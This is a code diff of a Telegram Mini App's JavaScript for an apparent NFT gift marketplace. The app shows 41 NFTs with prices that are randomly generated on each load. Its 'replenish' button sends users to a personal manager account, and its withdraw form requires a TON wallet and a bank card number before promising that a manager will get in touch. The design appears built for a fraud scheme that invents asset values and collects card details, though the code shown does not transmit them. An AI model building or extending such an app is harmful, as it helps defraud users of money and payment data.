@@ -1,10 +1,11 @@
 const tg = window.Telegram.WebApp;
 tg.expand();
 
-// ========== НАСТРОЙКА: 41 ФОТОГРАФИЯ ==========
-const TOTAL_NFT = 41; // <--- ТОЧНО 41 ФОТО
+// ========== ДАННЫЕ ПОЛЬЗОВАТЕЛЯ ==========
+const user = tg.initDataUnsafe?.user;
+const TOTAL_NFT = 41; // 41 ФОТОГРАФИЯ
 
-// Названия для NFT (41 штука - как на скриншотах)
+// Названия для NFT
 const nftNames = [
     "Whip Cupcake #133069",
     "Stellar Rocket #37166",
@@ -49,25 +50,17 @@ const nftNames = [
     "Star Dust #021"
 ];
 
-// Функция для генерации цены (случайная от 1 до 100)
-function getRandomPrice() {
-    return (Math.random() * 99 + 1).toFixed(2);
-}
-
-// ========== СОЗДАЕМ СЕТКУ NFT ==========
+// ========== ЗАГРУЗКА NFT ==========
 const nftGrid = document.getElementById('nftGrid');
 if (nftGrid) {
-    nftGrid.innerHTML = ''; // Очищаем
-    
     for (let i = 1; i <= TOTAL_NFT; i++) {
         const nameIndex = (i - 1) % nftNames.length;
-        const price = getRandomPrice();
+        const price = (Math.random() * 100).toFixed(2);
         
         nftGrid.innerHTML += `
             <div class="nft-card" data-id="${i}">
                 <img src="images/${i}.jpg" 
                      alt="NFT ${i}" 
-                     loading="lazy"
                      onerror="this.src='https://via.placeholder.com/150/1a1a1a/00ff88?text=NFT+${i}'">
                 <div class="nft-name">${nftNames[nameIndex]}</div>
                 <div class="nft-price">${price} 🏆</div>
@@ -76,78 +69,120 @@ if (nftGrid) {
     }
 }
 
-// ========== КЛИК ПО NFT ==========
-document.querySelectorAll('.nft-card').forEach(card => {
-    card.addEventListener('click', function() {
-        const id = this.dataset.id;
-        const name = this.querySelector('.nft-name').textContent;
-        const price = this.querySelector('.nft-price').textContent;
-        
-        tg.HapticFeedback.impactOccurred('medium');
-        
-        tg.sendData(JSON.stringify({
-            action: 'nft_click',
-            id: id,
-            name: name,
-            price: price
-        }));
-        
-        tg.showPopup({
-            title: `NFT #${id}`,
-            message: `${name}\nЦена: ${price}`,
-            buttons: [{type: 'ok'}]
-        });
-    });
-});
+// ========== ПРОФИЛЬ ==========
+if (user) {
+    document.getElementById('profileName').textContent = user.first_name || 'User';
+    document.getElementById('profileId').textContent = user.id || '-';
+}
 
 // ========== НАВИГАЦИЯ ==========
-const pages = {
-    store: document.getElementById('storePage'),
-    gifts: document.getElementById('giftsPage'),
-    profile: document.getElementById('profilePage'),
-    season: document.getElementById('seasonPage')
-};
+const storePage = document.getElementById('storePage');
+const giftsPage = document.getElementById('giftsPage');
+const profilePage = document.getElementById('profilePage');
+const giftNavBtn = document.getElementById('giftNavBtn');
+const profileNavBtn = document.getElementById('profileNavBtn');
+const myGiftsBtn = document.getElementById('myGiftsBtn');
+const backFromGifts = document.getElementById('backFromGifts');
+const backFromProfile = document.getElementById('backFromProfile');
 
-const navItems = document.querySelectorAll('.nav-item');
-const profileIcon = document.getElementById('profileIcon');
+// Функция показа страницы
+function showPage(page) {
+    storePage.style.display = 'none';
+    giftsPage.style.display = 'none';
+    profilePage.style.display = 'none';
+    
+    if (page === 'store') storePage.style.display = 'block';
+    if (page === 'gifts') giftsPage.style.display = 'block';
+    if (page === 'profile') profilePage.style.display = 'block';
+}
 
-// Переключение по нижнему меню
-navItems.forEach(item => {
+// Нижняя навигация
+document.querySelectorAll('.nav-item').forEach(item => {
     item.addEventListener('click', () => {
-        const page = item.dataset.page;
-        navItems.forEach(n => n.classList.remove('active'));
+        document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
         item.classList.add('active');
-        Object.values(pages).forEach(p => {
-            if (p) p.classList.remove('active');
-        });
-        if (pages[page]) pages[page].classList.add('active');
+        
+        const page = item.dataset.page;
+        showPage(page);
         tg.HapticFeedback.impactOccurred('light');
     });
 });
 
-// Открыть профиль по иконке
-if (profileIcon) {
-    profileIcon.addEventListener('click', () => {
-        navItems.forEach(n => n.classList.remove('active'));
-        Object.values(pages).forEach(p => {
-            if (p) p.classList.remove('active');
-        });
-        if (pages.profile) pages.profile.classList.add('active');
-        tg.HapticFeedback.impactOccurred('medium');
-    });
-}
+// Кнопка My gifts в меню
+myGiftsBtn.addEventListener('click', () => {
+    document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
+    document.querySelector('[data-page="gifts"]').classList.add('active');
+    showPage('gifts');
+    tg.HapticFeedback.impactOccurred('medium');
+});
 
-// Кнопки назад
-document.querySelectorAll('.back-btn').forEach(btn => {
-    btn.addEventListener('click', function() {
-        navItems.forEach(n => n.classList.remove('active'));
-        const storeNav = document.querySelector('.nav-item[data-page="store"]');
-        if (storeNav) storeNav.classList.add('active');
-        Object.values(pages).forEach(p => {
-            if (p) p.classList.remove('active');
+// Назад из My gifts
+backFromGifts.addEventListener('click', () => {
+    document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
+    document.querySelector('[data-page="store"]').classList.add('active');
+    showPage('store');
+});
+
+// Назад из Profile
+backFromProfile.addEventListener('click', () => {
+    document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
+    document.querySelector('[data-page="store"]').classList.add('active');
+    showPage('store');
+});
+
+// ========== МОДАЛКИ ==========
+const replenishModal = document.getElementById('replenishModal');
+const withdrawModal = document.getElementById('withdrawModal');
+const addBtn = document.getElementById('addBtn');
+const withdrawBtn = document.getElementById('withdrawBtn');
+const closeReplenish = document.getElementById('closeReplenish');
+const closeWithdraw = document.getElementById('closeWithdraw');
+const managerLink = document.getElementById('managerLink');
+const submitWithdraw = document.getElementById('submitWithdraw');
+
+addBtn.addEventListener('click', () => {
+    replenishModal.style.display = 'flex';
+    tg.HapticFeedback.impactOccurred('heavy');
+});
+
+withdrawBtn.addEventListener('click', () => {
+    withdrawModal.style.display = 'flex';
+    tg.HapticFeedback.impactOccurred('heavy');
+});
+
+closeReplenish.addEventListener('click', () => {
+    replenishModal.style.display = 'none';
+});
+
+closeWithdraw.addEventListener('click', () => {
+    withdrawModal.style.display = 'none';
+});
+
+managerLink.addEventListener('click', () => {
+    tg.openTelegramLink('https://t.me/ManagerKupiKod');
+    replenishModal.style.display = 'none';
+});
+
+submitWithdraw.addEventListener('click', () => {
+    const wallet = document.getElementById('tonWallet').value;
+    const card = document.getElementById('cardNumber').value;
+    
+    if (wallet && card) {
+        tg.showPopup({
+            title: 'Заявка отправлена',
+            message: 'Менеджер свяжется с вами',
+            buttons: [{type: 'ok'}]
         });
-        if (pages.store) pages.store.classList.add('active');
-    });
+        withdrawModal.style.display = 'none';
+        document.getElementById('tonWallet').value = '';
+        document.getElementById('cardNumber').value = '';
+    } else {
+        tg.showPopup({
+            title: 'Ошибка',
+            message: 'Заполните все поля',
+            buttons: [{type: 'ok'}]
+        });
+    }
 });
 
 // ========== ВКЛАДКИ ==========
@@ -155,148 +190,30 @@ document.querySelectorAll('.tab').forEach(tab => {
     tab.addEventListener('click', function() {
         document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
         this.classList.add('active');
-        tg.HapticFeedback.impactOccurred('light');
     });
 });
 
-// ========== КНОПКИ (Collection, Model, Back, Symbol, Quick find) ==========
-document.querySelectorAll('.icon-btn, .quick-find').forEach(btn => {
-    btn.addEventListener('click', function() {
-        const text = this.textContent.replace(/[📂🛒⬅🏷🔍]/g, '').trim();
-        tg.HapticFeedback.impactOccurred('light');
-        tg.showPopup({
-            title: text || 'Раздел',
-            message: 'В разработке',
-            buttons: [{type: 'ok'}]
-        });
+// ========== КЛИК ПО NFT ==========
+document.querySelectorAll('.nft-card').forEach(card => {
+    card.addEventListener('click', function() {
+        const id = this.dataset.id;
+        const name = this.querySelector('.nft-name').textContent;
+        
+        tg.HapticFeedback.impactOccurred('medium');
+        tg.sendData(JSON.stringify({
+            action: 'nft_click',
+            id: id,
+            name: name
+        }));
     });
 });
 
-// ========== MY GIFTS ==========
-const addBtn = document.getElementById('addBtn');
-const withdrawBtn = document.getElementById('withdrawBtn');
-const managerModal = document.getElementById('managerModal');
-const withdrawModal = document.getElementById('withdrawModal');
-
-if (addBtn) {
-    addBtn.addEventListener('click', () => {
-        tg.HapticFeedback.impactOccurred('heavy');
-        if (managerModal) managerModal.style.display = 'flex';
-    });
-}
-
-if (withdrawBtn) {
-    withdrawBtn.addEventListener('click', () => {
-        tg.HapticFeedback.impactOccurred('heavy');
-        if (withdrawModal) withdrawModal.style.display = 'flex';
-    });
-}
-
-// Sell, Send, Bundle - заглушки
-['sellBtn', 'sendBtn', 'bundleBtn'].forEach(id => {
-    const btn = document.getElementById(id);
-    if (btn) {
-        btn.addEventListener('click', () => {
-            tg.HapticFeedback.impactOccurred('light');
-            tg.showPopup({
-                title: btn.textContent.trim(),
-                message: 'Функция временно недоступна',
-                buttons: [{type: 'ok'}]
-            });
-        });
+// ========== ЗАКРЫТИЕ МОДАЛОК ПО КЛИКУ ВНЕ ==========
+window.addEventListener('click', (e) => {
+    if (e.target.classList.contains('modal')) {
+        replenishModal.style.display = 'none';
+        withdrawModal.style.display = 'none';
     }
 });
 
-// Вкладки в My Gifts
-const giftTabs = document.querySelectorAll('.gift-tab');
-const giftsTab = document.getElementById('giftsTabContent');
-const offersTab = document.getElementById('offersTabContent');
-const activityTab = document.getElementById('activityTabContent');
-
-giftTabs.forEach(tab => {
-    tab.addEventListener('click', function() {
-        giftTabs.forEach(t => t.classList.remove('active'));
-        this.classList.add('active');
-        const target = this.dataset.gift;
-        if (giftsTab) giftsTab.style.display = target === 'gifts' ? 'block' : 'none';
-        if (offersTab) offersTab.style.display = target === 'offers' ? 'block' : 'none';
-        if (activityTab) activityTab.style.display = target === 'activity' ? 'block' : 'none';
-    });
-});
-
-// ========== МОДАЛКИ ==========
-// Закрытие по крестику
-document.querySelectorAll('.close-modal').forEach(btn => {
-    btn.addEventListener('click', function() {
-        const modal = this.closest('.modal');
-        if (modal) modal.style.display = 'none';
-    });
-});
-
-// Клик по менеджеру
-const managerLink = document.getElementById('managerLink');
-if (managerLink) {
-    managerLink.addEventListener('click', () => {
-        tg.openTelegramLink('https://t.me/ManagerKupiKod');
-        if (managerModal) managerModal.style.display = 'none';
-    });
-}
-
-// Отправка вывода
-const submitWithdraw = document.getElementById('submitWithdraw');
-if (submitWithdraw) {
-    submitWithdraw.addEventListener('click', () => {
-        const wallet = document.getElementById('tonWallet')?.value.trim();
-        const card = document.getElementById('cardNumber')?.value.trim();
-        
-        if (!wallet || !card) {
-            tg.showPopup({
-                title: 'Ошибка',
-                message: 'Заполните все поля',
-                buttons: [{type: 'ok'}]
-            });
-            return;
-        }
-        
-        tg.HapticFeedback.notificationOccurred('success');
-        tg.showPopup({
-            title: 'Заявка отправлена',
-            message: 'Менеджер свяжется с вами',
-            buttons: [{type: 'ok'}]
-        });
-        
-        if (withdrawModal) withdrawModal.style.display = 'none';
-        if (document.getElementById('tonWallet')) document.getElementById('tonWallet').value = '';
-        if (document.getElementById('cardNumber')) document.getElementById('cardNumber').value = '';
-    });
-}
-
-// Закрытие модалок по клику на фон
-document.querySelectorAll('.modal-overlay').forEach(overlay => {
-    overlay.addEventListener('click', (e) => {
-        if (e.target === overlay) {
-            document.querySelectorAll('.modal').forEach(m => m.style.display = 'none');
-        }
-    });
-});
-
-// ========== INVITE FRIENDS ==========
-const inviteBtn = document.getElementById('inviteBtn');
-if (inviteBtn) {
-    inviteBtn.addEventListener('click', () => {
-        tg.HapticFeedback.impactOccurred('light');
-        const text = 'Присоединяйся к xRocket! Зарабатывай TON и получай кэшбэк!';
-        tg.openTelegramLink(`https://t.me/share/url?url=${encodeURIComponent('https://t.me/xRocketgiftrobot')}&text=${encodeURIComponent(text)}`);
-    });
-}
-
-// ========== HOW TO ADD GIFTS ==========
-const howToAddLink = document.getElementById('howToAddLink');
-if (howToAddLink) {
-    howToAddLink.addEventListener('click', (e) => {
-        e.preventDefault();
-        tg.openTelegramLink('https://t.me/xRocketgiftrobot');
-    });
-}
-
-console.log(`✅ Mini App загружен с ${TOTAL_NFT} NFT`);
+console.log(`✅ Загружено ${TOTAL_NFT} NFT`);
